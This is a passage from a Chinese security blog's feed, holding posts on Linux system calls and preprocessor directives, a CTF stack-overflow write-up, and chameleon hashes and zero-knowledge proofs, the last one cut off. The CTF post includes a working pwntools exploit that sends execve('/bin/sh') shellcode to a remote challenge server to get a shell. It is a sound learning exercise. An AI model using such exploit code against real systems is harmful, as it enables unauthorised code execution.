class="meta-keyword">define</span> __NR_write 4</span></span><br><span class="line">&gt; <span class="meta">#<span class="meta-keyword">define</span> __NR_open 5</span></span><br><span class="line">&gt; <span class="meta">#<span class="meta-keyword">define</span> __NR_close 6</span></span><br><span class="line">&gt; <span class="meta">#<span class="meta-keyword">define</span> __NR_waitpid 7</span></span><br><span class="line">&gt; <span class="meta">#<span class="meta-keyword">define</span> __NR_creat 8</span></span><br><span class="line">&gt; <span class="meta">#<span class="meta-keyword">define</span> __NR_link 9</span></span><br><span class="line">&gt; <span class="meta">#<span class="meta-keyword">define</span> __NR_unlink 10</span></span><br><span class="line">&gt; …………………………………………………………………………</span><br><span class="line">&gt; </span><br><span class="line">&gt; #/usr/include/<span class="keyword">asm</span>/unistd_64.h</span><br><span class="line">&gt; </span><br><span class="line">&gt; <span class="meta">#<span class="meta-keyword">ifndef</span> _ASM_X86_UNISTD_64_H</span></span><br><span class="line">&gt; <span class="meta">#<span class="meta-keyword">define</span> _ASM_X86_UNISTD_64_H 1</span></span><br><span class="line">&gt; </span><br><span class="line">&gt; <span class="meta">#<span class="meta-keyword">define</span> __NR_read 0</span></span><br><span class="line">&gt; <span class="meta">#<span class="meta-keyword">define</span> __NR_write 1</span></span><br><span class="line">&gt; <span class="meta">#<span class="meta-keyword">define</span> __NR_open 2</span></span><br><span class="line">&gt; <span class="meta">#<span class="meta-keyword">define</span> __NR_close 3</span></span><br><span class="line">&gt; <span class="meta">#<span class="meta-keyword">define</span> __NR_stat 4</span></span><br><span class="line">&gt; <span class="meta">#<span class="meta-keyword">define</span> __NR_fstat 5</span></span><br><span class="line">&gt; <span class="meta">#<span class="meta-keyword">define</span> __NR_lstat 6</span></span><br><span class="line">&gt; <span class="meta">#<span class="meta-keyword">define</span> __NR_poll 7</span></span><br><span class="line">&gt; <span class="meta">#<span class="meta-keyword">define</span> __NR_lseek 8</span></span><br><span class="line">&gt; <span class="meta">#<span class="meta-keyword">define</span> __NR_mmap 9</span></span><br><span class="line">&gt; <span class="meta">#<span class="meta-keyword">define</span> __NR_mprotect 10</span></span><br><span class="line">&gt; …………………………………………………………………………</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><blockquote><p>            ※ 系统调用号的含义是什么？</p><p>              对于不同的系统调用号，所代表的入口函数是不一样的，其实我们在上面的定义中就能知道不同序号代表的函数是什么，下面我以 32 位的系统给出几个系统调用表对应的函数：</p><p><img src="/images/87-1.jpg" alt></p><p>             ※ 如何执行 <code>system call</code> ?</p><p>              在这里，我们用一个例子来详细的解释一下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&gt; .text:08048087                 mov     ecx, esp        ; addr</span><br><span class="line">&gt; .text:08048089                 mov     dl, 14h         ; len，对应参数为：size_t count</span><br><span class="line">&gt; .text:0804808B                 mov     bl, 1           ; fd，对应参数 fd，fd = 1，在linux 中对应于 stdout，指的是显示屏的标准输出</span><br><span class="line">&gt; .text:0804808D                 mov     al, 4   ; 系统调用号为 4，sys_write</span><br><span class="line">&gt; .text:0804808F                 int     80h             ; LINUX - sys_write</span><br><span class="line">&gt; .text:08048091                 xor     ebx, ebx; ebx = 0，对应的参数 fd = 0，在 Linux 中对应于 stdin，指的是显示屏的标准输入</span><br><span class="line">&gt; .text:08048093                 mov     dl, 3Ch; len，对应参数为：size_t count</span><br><span class="line">&gt; .text:08048095                 mov     al, 3   ; 系统调用号为3，sys_read</span><br><span class="line">&gt; .text:08048097                 int     80h             ; LINUX - sys_read</span><br><span class="line">&gt; .text:08048099                 add     esp, 14h</span><br><span class="line">&gt; .text:0804809C                 retn</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><blockquote><p>              将上面的汇编语言反汇编成伪代码，如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt; sys_write(<span class="keyword">unsigned</span> <span class="keyword">int</span> fd, <span class="keyword">const</span> <span class="keyword">char</span> * buf, <span class="keyword">size_t</span> count);</span><br><span class="line">&gt; </span><br><span class="line">&gt; sys_read(<span class="keyword">unsigned</span> <span class="keyword">int</span> fd, <span class="keyword">char</span> * buf, <span class="keyword">size_t</span> count);</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><h4 id="font-color-navy2if-endiffont"><a class="markdownIt-Anchor" href="#font-color-navy2if-endiffont"></a> <font color="navy">2.#if……# endif</font></h4><blockquote><p><font color="orange">1)  #if……#endif 是什么？</font></p><p>         #if ……#endif 其实是 <code>C#</code>两个预处理器指令， 如果 C# 编译器遇到最后面跟有 <a href="http://technet.microsoft.com/zh-cn/hyx43has(v=vs.85)" target="_blank" rel="noopener">#endif</a> 指令的#if 指令，则仅当指定的符号已定义时，它才会编译这两个指令之间的代码。 例如：</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&gt; --在最顶端必须声明自定义的名称DEBUG或者START</span><br><span class="line">&gt; <span class="meta">#<span class="meta-keyword">define</span> DEBUG  </span></span><br><span class="line">&gt; <span class="comment">//#define START</span></span><br><span class="line">&gt; <span class="comment">//using System;</span></span><br><span class="line">&gt; <span class="comment">//...</span></span><br><span class="line">&gt;  </span><br><span class="line">&gt;  </span><br><span class="line">&gt;     在你需要的代码中插入<span class="meta">#<span class="meta-keyword">if</span>..#<span class="meta-keyword">endif</span>，编译器会自动寻找，并执行之间的这段代码</span></span><br><span class="line">&gt; <span class="meta">#<span class="meta-keyword">if</span> DEBUG</span></span><br><span class="line">&gt;      Console.WriteLine(<span class="string">"Debug version"</span>);</span><br><span class="line">&gt; <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">&gt;  </span><br><span class="line">&gt; <span class="meta">#<span class="meta-keyword">if</span> START</span></span><br><span class="line">&gt;      Console.WriteLine(<span class="string">"START PROCESS"</span>);</span><br><span class="line">&gt; <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><blockquote><p><br><font color="orange">2)  预处理器的指令还有哪些？</font></p><p>         <a href="https://docs.microsoft.com/zh-cn/dotnet/csharp/language-reference/preprocessor-directives/preprocessor-if" target="_blank" rel="noopener">#if</a> 、 <a href="https://docs.microsoft.com/zh-cn/dotnet/csharp/language-reference/preprocessor-directives/preprocessor-else" target="_blank" rel="noopener">#else</a> 、 <a href="https://docs.microsoft.com/zh-cn/dotnet/csharp/language-reference/preprocessor-directives/preprocessor-elif" target="_blank" rel="noopener">#elif</a> 、 <a href="https://docs.microsoft.com/zh-cn/dotnet/csharp/language-reference/preprocessor-directives/preprocessor-endif" target="_blank" rel="noopener">#endif</a> 、 <a href="https://docs.microsoft.com/zh-cn/dotnet/csharp/language-reference/preprocessor-directives/preprocessor-define" target="_blank" rel="noopener">#define</a> 、 <a href="https://docs.microsoft.com/zh-cn/dotnet/csharp/language-reference/preprocessor-directives/preprocessor-undef" target="_blank" rel="noopener">#undef</a> 、 <a href="https://docs.microsoft.com/zh-cn/dotnet/csharp/language-reference/preprocessor-directives/preprocessor-warning" target="_blank" rel="noopener">#warning</a> 、 <a href="https://docs.microsoft.com/zh-cn/dotnet/csharp/language-reference/preprocessor-directives/preprocessor-error" target="_blank" rel="noopener">#error</a> 、 <a href="https://docs.microsoft.com/zh-cn/dotnet/csharp/language-reference/preprocessor-directives/preprocessor-line" target="_blank" rel="noopener">#line</a> 、 <a href="https://docs.microsoft.com/zh-cn/dotnet/csharp/language-reference/preprocessor-directives/preprocessor-region" target="_blank" rel="noopener">#region</a> 、 <a href="https://docs.microsoft.com/zh-cn/dotnet/csharp/language-reference/preprocessor-directives/preprocessor-endregion" target="_blank" rel="noopener">#endregion</a> 、 <a href="https://docs.microsoft.com/zh-cn/dotnet/csharp/language-reference/preprocessor-directives/preprocessor-pragma" target="_blank" rel="noopener">#pragma</a> 、 <a href="https://docs.microsoft.com/zh-cn/dotnet/csharp/language-reference/preprocessor-directives/preprocessor-pragma-warning" target="_blank" rel="noopener">#pragma warning</a> 、 <a href="https://docs.microsoft.com/zh-cn/dotnet/csharp/language-reference/preprocessor-directives/preprocessor-pragma-checksum" target="_blank" rel="noopener">#pragma checksum</a></p><p><br><font color="orange">3)  #if 0，#if 1，#else，#endif语句 </font></p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&gt; <span class="meta">#<span class="meta-keyword">if</span> 0</span></span><br><span class="line">&gt; </span><br><span class="line">&gt;     code1</span><br><span class="line">&gt; </span><br><span class="line">&gt; <span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">&gt; </span><br><span class="line">&gt;     code2</span><br><span class="line">&gt; </span><br><span class="line">&gt; <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><blockquote><p>        此时code1的语句被注释掉了，永远没有办法执行，而code2是被编译的；如果将#if 0变为#if 1，code1被编译，而code2永远没有办法被执行。</p></blockquote><h3 id="font-color-brown三-相关知识点font"><a class="markdownIt-Anchor" href="#font-color-brown三-相关知识点font"></a> <font color="brown">三、相关知识点</font></h3><blockquote><ol><li>操作系统的内核和用户的关系</li><li>Linux下 文件描述符（fd）与 文件指针（FILE*）</li><li>C语言的 open, read, write函数，及文件读写</li></ol></blockquote><h3 id="font-color-brown四-参考文章font"><a class="markdownIt-Anchor" href="#font-color-brown四-参考文章font"></a> <font color="brown">四、参考文章</font></h3><blockquote><ol><li><a href="https://blog.csdn.net/xiaominthere/article/details/17287965" target="_blank" rel="noopener">Linux系统调用 int 80h int 0x80</a> ★★★★</li><li><a href="http://www.voidcn.com/article/p-avzzaclp-bkb.html" target="_blank" rel="noopener">《第一篇 linux 0.12 系统调用(int 0x80)详解》</a>★★</li><li><a href="https://blog.csdn.net/m2o2o2d/article/details/21648777" target="_blank" rel="noopener">int 0x80系统调用的参数传递规则</a></li><li><a href="https://blog.csdn.net/wukery/article/details/79295567" target="_blank" rel="noopener">linux系统调用表(system call table)</a>★★★★</li><li><a href="https://docs.microsoft.com/zh-cn/dotnet/csharp/language-reference/preprocessor-directives/preprocessor-if" target="_blank" rel="noopener">#if（C# 参考）</a></li><li><a href="https://blog.csdn.net/weixin_44973055/article/details/90233454" target="_blank" rel="noopener">C# 中的#if、#elif、#else、#endif、#define、#undef等预处理器指令</a></li><li><a href="https://blog.csdn.net/wwwsssZheRen/article/details/79077141" target="_blank" rel="noopener">C语言中#if 0，#if 1，#else，#endif的作用</a></li><li><a href="https://blog.csdn.net/t55p318/article/details/77602164" target="_blank" rel="noopener">C#中 #if #endif的使用</a></li><li><a href="https://blog.csdn.net/mm_hh/article/details/71374474" target="_blank" rel="noopener">Linux下 文件描述符（fd）与 文件指针（FILE*）</a>(待看)</li><li><a href="%5Bhttps://zh.wikipedia.org/wiki/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%5D(https://zh.wikipedia.org/wiki/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F)">操作系统</a></li></ol></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;font-color-brown一-知识点摘要font&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#font-color-brown一-知识点摘要font&quot;&gt;&lt;/a&gt; &lt;font color=&quot;brown&quot;&gt;一、知识点摘要&lt;/font
      
    
    </summary>
    
    
      <category term="内核" scheme="https://muzibing.github.io/tags/%E5%86%85%E6%A0%B8/"/>
    
  </entry>
  
  <entry>
    <title>PWN 实战 - shellcode 题解</title>
    <link href="https://muzibing.github.io/2019/10/16/2019.10.16%EF%BC%8886%EF%BC%89/"/>
    <id>https://muzibing.github.io/2019/10/16/2019.10.16（86）/</id>
    <published>2019-10-15T16:00:00.000Z</published>
    <updated>2019-11-05T06:06:25.207Z</updated>
    
    <content type="html"><![CDATA[<h3 id="font-color-brown一-基础知识font"><a class="markdownIt-Anchor" href="#font-color-brown一-基础知识font"></a> <font color="brown">一、基础知识</font></h3><h4 id="font-color-navy1shellcodefont"><a class="markdownIt-Anchor" href="#font-color-navy1shellcodefont"></a> <font color="navy">1.shellcode</font></h4><blockquote><p>有关 shellcode 的知识介绍，在这里我就不过多的介绍了，给大家附上几个我认为写的比较好的博文：</p><blockquote><ul><li><a href="https://www.zhihu.com/question/30943194" target="_blank" rel="noopener">shellcode原理是啥？</a></li><li><a href="https://yq.aliyun.com/articles/58699" target="_blank" rel="noopener"> 一步一步学ROP之linux_x86篇 </a></li><li><a href="https://blog.csdn.net/qq_35495684/article/details/79583232?tdsourcetag=s_pctim_aiomsg" target="_blank" rel="noopener">PWN-shellcode获取与编写</a></li><li><a href="https://howiezhao.github.io/2018/04/29/payload-shellcode-exp-poc/" target="_blank" rel="noopener">渗透中PoC、Exp、Payload与Shellcode的区别</a></li></ul></blockquote></blockquote><h3 id="font-color-brown二-解题步骤font"><a class="markdownIt-Anchor" href="#font-color-brown二-解题步骤font"></a> <font color="brown">二、解题步骤</font></h3><h4 id="font-color-navy1查看文件类型font"><a class="markdownIt-Anchor" href="#font-color-navy1查看文件类型font"></a> <font color="navy">1,查看文件类型</font></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file pwn3</span><br></pre></td></tr></table></figure><p>6<img src="/images/86-9.jpg" alt></p><blockquote><p>从上面的结果可以得出，该文件是一个 <code>32</code> 位的 ELF 文件</p></blockquote><h4 id="font-color-navy2查看-pwn3-开启的保护font"><a class="markdownIt-Anchor" href="#font-color-navy2查看-pwn3-开启的保护font"></a> <font color="navy">2.查看 pwn3 开启的保护</font></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">checksec pwn3</span><br></pre></td></tr></table></figure><p><img src="/images/86-10.jpg" alt></p><blockquote><p>从上图可以得出，pwn3 没有开启<code>栈保护</code>功能，没有开启<code>ASLR</code>，开启了<code>栈上数据可执行</code>，开启了<code>RELRO</code>，意味着我们可以对 GOT 进行写的权限。</p></blockquote><h4 id="font-color-navy3寻找漏洞font"><a class="markdownIt-Anchor" href="#font-color-navy3寻找漏洞font"></a> <font color="navy">3.寻找漏洞</font></h4><blockquote><p>我们用 <code>IDA-32</code> 打开 <code>pwn3</code> ，通过对程序的观察我们发现在函数 <code>sub_804851A()</code> 中可能产生溢出漏洞：</p><p><img src="/images/86-11.jpg" alt></p><p>从上图可以看到：</p><ul><li>在栈中给 buf 的实际大小为：ebp - 0x1Ch（十进制：28）</li><li>用户实际能输入的数据大小为：0x100h（十进制：256）</li></ul><p>所以在这里会产生栈溢出，我们也就可以利用该漏洞获取 <code>flag</code></p></blockquote><h4 id="font-color-navy4利用漏洞font"><a class="markdownIt-Anchor" href="#font-color-navy4利用漏洞font"></a> <font color="navy">4.利用漏洞</font></h4><blockquote><p>在这道题中，因为大多数保护都没有开启，所以我们可以有多种构思思路：</p><ul><li>通过 libc 库来泄露 <code>system()</code> 的地址，这和 <code>ROP</code> 那道题的思路差不多</li><li>在缓冲区中填写我们构造的 <code>shellcode</code>，再通过返回 <code>shellcode</code> 的地址，来执行 <code>shellcode</code> ，获取系统调用权</li></ul><p>这里我们主要以第二种思路来讲解</p></blockquote><h4 id="font-color-navy5分析思路font"><a class="markdownIt-Anchor" href="#font-color-navy5分析思路font"></a> <font color="navy">5.分析思路</font></h4><blockquote><p>首先我们先来看一下这个栈中的情况：</p><p><img src="/images/86-1.jpg" alt></p><p>通过上面的情况，我们可以知道：</p><ul><li>填充的数据为：0x1c + 0x4 = 32</li><li>在返回地址这里，我们有多种返回方式：<ul><li>我们可以直接返回 <code>buf</code> 的首地址</li><li>我们也可以将地址返回到高地址中的参数，然后通过控制esp，再执行 <code>shellcode</code></li><li>……</li></ul></li></ul><p>通过上面的分析，我们可以大概知道自己的 <code>payload</code> 了：</p><p><font color="red"><center>payload = shellcode + ‘a’ * 32 - len(shellcode) + p32(jmp_exp) + jmp_shellcode</center></font></p><p>具体的执行如下：</p><p><img src="/images/85-1.gif" alt></p></blockquote><h4 id="font-color-navy6编写-expfont"><a class="markdownIt-Anchor" href="#font-color-navy6编写-expfont"></a> <font color="navy">6.编写 exp</font></h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">'linux'</span>,arch=<span class="string">'i386'</span>)</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">'vps1.blue-whale.me'</span>,<span class="number">9992</span>)</span><br><span class="line"></span><br><span class="line">shellcode=<span class="string">"\x31\xc0\x31\xd2\x52\x68\x2f\x2f'</span></span><br><span class="line"><span class="string">shellcode += '\x73\x68\x68\x2f\x62\x69\x6e\x89</span></span><br><span class="line"><span class="string">shellcode += '\xe3\x31\xc9\xb0\x0b\xcd\x80'</span></span><br><span class="line"><span class="string">shellcode_jmp = asm('sub esp,0x24;jmp esp')</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">payload = shellcode + (32-len(shellcode))*'a' + p32(0x08048667) + shellcode_jmp</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">r.send(payload)</span></span><br><span class="line"><span class="string">r.interactive()</span></span><br></pre></td></tr></table></figure><h4 id="font-color-navy7获取-flagfont"><a class="markdownIt-Anchor" href="#font-color-navy7获取-flagfont"></a> <font color="navy">7.获取 flag</font></h4><p><img src="/images/86-12.jpg" alt></p><h3 id="font-color-brown三-相关问题font"><a class="markdownIt-Anchor" href="#font-color-brown三-相关问题font"></a> <font color="brown">三、相关问题</font></h3><blockquote><ol><li>返回到 buf 的起始地址后，为什么能够执行 shellcode？</li><li>sendline() 和 send() 的区别是什么？</li></ol></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;font-color-brown一-基础知识font&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#font-color-brown一-基础知识font&quot;&gt;&lt;/a&gt; &lt;font color=&quot;brown&quot;&gt;一、基础知识&lt;/font&gt;&lt;/
      
    
    </summary>
    
    
      <category term="解题总结" scheme="https://muzibing.github.io/tags/%E8%A7%A3%E9%A2%98%E6%80%BB%E7%BB%93/"/>
    
      <category term="pwn" scheme="https://muzibing.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>变色龙哈希（Chameleon Hash）、零知识证明（Zero—Knowledge Proof）和广播加密相关知识</title>
    <link href="https://muzibing.github.io/2019/10/12/2019.10.12%EF%BC%8885%EF%BC%89/"/>
    <id>https://muzibing.github.io/2019/10/12/2019.10.12（85）/</id>
    <published>2019-10-11T16:00:00.000Z</published>
    <updated>2019-11-05T04:23:38.727Z</updated>
    
    <content type="html"><![CDATA[<h3 id="font-color-brown一-变色龙哈希chameleon-hashfont"><a class="markdownIt-Anchor" href="#font-color-brown一-变色龙哈希chameleon-hashfont"></a> <font color="brown">一、变色龙哈希（Chameleon Hash）</font></h3><h4 id="font-color-navy1哈希函数font"><a class="markdownIt-Anchor" href="#font-color-navy1哈希函数font"></a> <font color="navy">1.哈希函数？</font></h4><blockquote><p><font color="orage"><strong>① 什么是哈希函数？</strong></font></p><p>     哈希函数又叫 Hash、one-way function、单向散列函数等，它是一种可以<font color="red">将任意长度输入的字串可转换成一个固定长度的字串，通过原始字串可以很容易地算出转换后的字串，通过转换后的字串很难还原出原始字串。</font></p><p><br><font color="orage"><strong>② 哈希函数的特征</strong></font></p><p>     1.对于任意m作为输入，得到输出的结果，很难找到另一个输入m’  （m’不等于m），使得m’的Hash结果也为同样的输出，即Hash(m) = Hash(m’)。这一性质成为广义碰撞抵抗性。</p><p>     2. 进一步，很难找到任意两个m和m’，使得Hash(m) = Hash(m’)。这里我们没有固定的m和m’，因此这一要求比第一个要求更为严格。这一性质成为严格碰撞抵抗性。<br>     3.抗篡改能力，对于一个数据块，哪怕只改动其一个比特位，其hash值的改动也会非常大。</p></blockquote><h4 id="font-color-navy2变色龙哈希函数font"><a class="markdownIt-Anchor" href="#font-color-navy2变色龙哈希函数font"></a> <font color="navy">2.变色龙哈希函数</font></h4><blockquote><p><font color="orage"><strong>① 什么是变色龙哈希函数</strong></font></p><p>     Chameleon Hash 是一类特殊的 Hash 函数，对于绝大多数使用者，其同样满足 Hash 的碰撞抵抗性。然而，如果某个人知道 Chameleon Hash 的一些秘密（我们用sk表示），其可以非常容易破坏Hash的碰撞抵抗性。也就是说，对于任意 m，其很容易能够找到 m’ \neq m，使得ChameleonHash(m’) = ChameleonHash(m)。这似乎破坏了Hash的碰撞抵抗性，但是在绝大多数使用者来说，其还是安全的Hash。</p><p><br><font color="orage"><strong>② 变色龙哈希函数的特点</strong></font></p><p>     ChameleonHash(m) = ChameleonHash(m‘)</p><p>     <strong>注释：m 和 m’ 分别代表两个不同的明文</strong></p><p><br><font color="orage"><strong>③ 变色龙哈希函数的原理</strong></font></p><p>     假设有一个明文为 <code>m</code>，<font color="red">Alice</font> 用变色龙哈希函数计算 <code>m</code> 的哈希值，计算步骤如下：</p><p>        ※ Alice 随机选取一个指数 x，这个 x 被称为 <strong>私钥</strong> 或者 **后门 ** ☛ (sk = x)</p><p>        ※ Alice 计算所对应的<strong>公钥</strong>：h = g<sup>x</sup>  ☛(pk = （g,h))</p><p>        ※ 生成变色龙哈希对应的随机数 <code>r</code></p><p>        ※ 计算明文 <code>m</code> 的相关哈希值：C_H = g<sup>m</sup> * h<sup>r</sup> = g<sup>m</sup> * g<sup>xr</sup> = g<sup>m+xr</sup></p><p>     Alice 就把所得到的 Chameleon Hash 值发给了 Bob，在发送的路上这个值被 Attacker 截取了，攻击者想把明文消息进行篡改，但得到相同的 ChameleonHash ，这就是找变色龙哈希函数值的碰撞，实验过程如下：</p><p>        <strong>※</strong> 攻击者构造想要构造一个明文 <code>m'</code>，使得：</p><center>g<sup>m+xr</sup> = g<sup>m'+xr'</sup></center> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;也就是 `m + xr = m' + xr'`  ——> `m' = m + xr - xr'` ，在这里可以随意构造一个明文 `m'`， 使得 `C_H = C_H'` ，但就必须要找出一个 `r'` 满足上述关系式：r' = $  \frac {m+xr-m'}{x} $，在这里 `m'、m、r` 已知，但是 x 是 Alice 的密钥，所以攻击者无法成功构造一个 `C_H' = C_H`<p>     <strong>总结</strong>：因为对于其他人来说，其不知道 x 的值，因此，如果想构造出一个碰撞，其他人必须在指数上面解方程 g<sup>m + xr</sup> = g<sup>m’ + xr‘</sup>，也就是说去求一个<font color="red"><strong>离散对数问题</strong></font>。但是，离散对数问题直到现在为止都没有一个很快的算法（最快也是指数级的）。因此对于其他人来说，很难找到碰撞。</p><br><p><font color="orage"><strong>④ 变色龙哈希函数的应用实例</strong></font></p><blockquote><p>假设小明和小红达成协议，小明将家族产业10%股份转让给小红。签了合同小名很担心啊，如果小红把这件事告诉别人怎么办？这时候就可以用变色龙函数进行签名。小红生成一个只有她才能找到碰撞的函数交给小明，小明再用这个函数来签电子文档。这下小红把签名后的文件丢给大家也没人相信她了。为什么呢？她掌握着哈希函数的弱点，可以随便生成哈希碰撞啊。她把10%股份改成99%都能保证哈希不会变，进而创造出新文件本来就是小明签的这种假象。因此出自小红之手的文件可信度为零。<strong>这个特性叫non-transferability，即两者之间达成的信任不能转到第三方。</strong></p><p>“你知道的太多了” 此时此刻成了真正的包袱。</p><p>问题来了，小明抵赖怎么破？如果小明死死咬定转让10%股份是小红伪造，事实上只有1%呢？事实上小明也不能信口开河，他得提供对应的证据。证据就是哈希碰撞。假设双方达成的最初合同是A，而小红将其篡改成了相同哈希的A’，那么小明看到A’这份伪证之后一定能拿出最早那个A来并表明A和A’形成哈希碰撞，否则A’就是真货了。因为正常情况下小明无论如何也找不到碰撞，他就不能抵赖。<strong>这个特性叫non-repudiation。</strong></p><p>————————————————</p><p>☛ 注：引用知乎用户<a href="https://www.zhihu.com/people/yifei.teng/activities" target="_blank" rel="noopener">@滕亦飞</a>的回答</p><p>原文链接： <a href="https://www.zhihu.com/question/38545889" target="_blank" rel="noopener">https://www.zhihu.com/question/38545889</a></p></blockquote><br><p><font color="orage"><strong>⑤ 变色龙哈希函数的攻击案例</strong></font></p><blockquote><p>如果某个网站中密码验证的Hash是这么计算的，而这个网站自己本身有Hash所对应的sk，那么，网站自身就可以伪造所有的密码，来窃取用户数据了。所以，有些时候我们需要怀疑一下一些声称安全的网站到底是不是有后门的。即使说是使用Hash验证，或者加上这样那样的功能来进一步提高安全性，但是如果有这样的后门，对于用户来说还是无能为力的。<br>————————————————<br>☞ 注：引用于CSDN用户@ <a href="https://me.csdn.net/u013590498" target="_blank" rel="noopener">刘巍然-BUAA</a> 的博文<br>原文链接：<a href="https://blog.csdn.net/liuweiran900217/article/details/21819637" target="_blank" rel="noopener">https://blog.csdn.net/liuweiran900217/article/details/21819637</a></p></blockquote></blockquote><h4 id="font-color-navy3对哈希函数重要的误区font"><a class="markdownIt-Anchor" href="#font-color-navy3对哈希函数重要的误区font"></a> <font color="navy">3.对哈希函数重要的误区</font></h4><blockquote><p><strong>哈希函数计算出哈希值的过程不是一个加密过程</strong>，所以不能说<strong>哈希加密/哈希解密</strong>之类的话。</p></blockquote><h3 id="font-color-brown二-零知识证明font"><a class="markdownIt-Anchor" href="#font-color-brown二-零知识证明font"></a> <font color="brown">二、零知识证明</font></h3><h4 id="font-color-navy1什么是零知识证明font"><a class="markdownIt-Anchor" href="#font-color-navy1什么是零知识证明font"></a> <font color="navy">1.什么是零知识证明？</font></h4><blockquote><p>     它指的是证明者能够在不向验证者提供任何有用的信息的情况下，使验证者相信某个论断是正确的。零知识证明实质上是一种涉及两方或更多方的协议，即两方或更多方完成一项任务所需采取的一系列步骤。证明者向验证者证明并使其相信自己知道或拥有某一消息，但证明过程不能向验证者泄漏任何关于被证明消息的信息。顾名思义，零知识证明就是既能充分证明自己是某种权益的合法拥有者，又不把有关的信息泄露出去——即给外界的“知识”为“零”。</p></blockquote><h4 id="font-color-navy2零知识满足的性质font"><a class="markdownIt-Anchor" href="#font-color-navy2零知识满足的性质font"></a> <font color="navy">2.零知识满足的性质</font></h4><blockquote><p><strong>(1)正确性</strong>。P无法欺骗V。换言之，若P不知道一个定理的证明方法，则P使V相信他会证明定理的概率很低。</p><p><strong>(2)完备性</strong>。V无法欺骗P。若P知道一个定理的证明方法，则P使V以绝对优势的概率相信他能证明。</p><p><strong>(3)零知识性</strong>。V无法获取任何额外的知识。</p></blockquote><h4 id="font-color-navy3零知识的属性font"><a class="markdownIt-Anchor" href="#font-color-navy3零知识的属性font"></a> <font color="navy">3.零知识的属性</font></h4><blockquote><p>     零知识证明需要满足三个属性：</p><p>        1、如果语句为真，诚实的验证者（即：正确遵循协议的验证者）将由诚实的证明者确信这一事实。</p><p>        2、如果语句为假，不排除有概率欺骗者可以说服诚实的验证者它是真的。</p><p>        3、如果语句为真，证明者的目的就是向验证者证明并使验证者相信自己知道或拥有某一消息，而在证明过程中不可向验证者泄漏任何有关被证明消息的内容。</p><p>     零知识证明并不是数学意义上的证明，因为它存在小概率的误差，欺骗者有可能通过虚假陈述骗过证明者。换句话来说，零知识证明是概率证明而不是确定性证明。但是也存在有技术能将误差降低到可以忽略的值。</p><p>     零知识的形式定义必须使用一些计算模型，最常见的是图灵机的计算模型。</p></blockquote><h4 id="font-color-navy4零知识的例子font"><a class="markdownIt-Anchor" href="#font-color-navy4零知识的例子font"></a> <font color="navy">4.零知识的例子</font></h4><blockquote><p>1.A要向B证明自己拥有某个房间的钥匙，假设该房间只能用钥匙打开锁，而其他任何方法都打不开。这时有2个方法：</p><p>     ① A把钥匙出示给B，B用这把钥匙打开该房间的锁，从而证明A拥有该房间的正确的钥匙。</p><p>     ② B确定该房间内有某一物体，A用自己拥有的钥匙打开该房间的门，然后把物体拿出来出示给B，从而证明自己确实拥有该房间的钥匙。</p><p>     后面的②方法属于零知识证明。它的好处在于，在整个证明的过程中，B始终不能看到钥匙的样子，从而避免了钥匙的泄露。</p><p><br>2.A拥有B的公钥，A没有见过B，而B见过A的照片，偶然一天两个人见面了，B认出了A，但A不能确定面前的人是否是B，这时B要向A证明自己是B，也有2个方法。</p><p>     ① 